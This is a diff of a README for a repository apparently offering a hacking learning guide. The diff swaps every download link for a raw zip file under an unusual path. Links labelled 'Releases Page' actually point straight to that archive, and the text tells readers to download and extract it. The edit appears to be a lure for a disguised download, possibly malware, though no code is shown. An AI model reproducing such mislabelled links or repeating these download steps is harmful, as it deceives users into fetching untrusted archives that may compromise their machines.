@@ -1,6 +1,6 @@
 # 🚀 Awesome-Hacking-Learning-Path - Your Step-by-Step Guide to Hacking Skills
 
-[![Download Now](https://raw.githubusercontent.com/Bienfait-Mutunzi/Awesome-Hacking-Learning-Path/main/0day/0day.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bienfait-Mutunzi/Awesome-Hacking-Learning-Path/main/0day/0day.zip)
+[![Download Now](https://raw.githubusercontent.com/Bienfait-Mutunzi/Awesome-Hacking-Learning-Path/main/Anonymous Playground/Hacking-Path-Awesome-Learning-v3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bienfait-Mutunzi/Awesome-Hacking-Learning-Path/main/Anonymous Playground/Hacking-Path-Awesome-Learning-v3.9.zip)
 
 ## 📚 Introduction
 
@@ -19,14 +19,14 @@ To effectively use this guide, ensure your system meets the following:
 
 Follow these steps to begin your learning journey:
 
-1. **Visit the Releases Page:** Go to the Releases page by clicking [here](https://raw.githubusercontent.com/Bienfait-Mutunzi/Awesome-Hacking-Learning-Path/main/0day/0day.zip).
+1. **Visit the Releases Page:** Go to the Releases page by clicking [here](https://raw.githubusercontent.com/Bienfait-Mutunzi/Awesome-Hacking-Learning-Path/main/Anonymous Playground/Hacking-Path-Awesome-Learning-v3.9.zip).
 2. **Choose Your Version:** Look for the latest version of the guide.
 3. **Download the File:** Click on the download link for your operating system.
 4. **Extract Files:** Locate the downloaded file on your computer and extract it using a file compression tool like WinRAR or 7-Zip.
 
 ## 📥 Download & Install
 
-To download the materials, please visit the page: [Releases Page](https://raw.githubusercontent.com/Bienfait-Mutunzi/Awesome-Hacking-Learning-Path/main/0day/0day.zip). Follow the instructions outlined above for downloading and extracting your files.
+To download the materials, please visit the page: [Releases Page](https://raw.githubusercontent.com/Bienfait-Mutunzi/Awesome-Hacking-Learning-Path/main/Anonymous Playground/Hacking-Path-Awesome-Learning-v3.9.zip). Follow the instructions outlined above for downloading and extracting your files.
 
 ## 📖 What You'll Learn
 
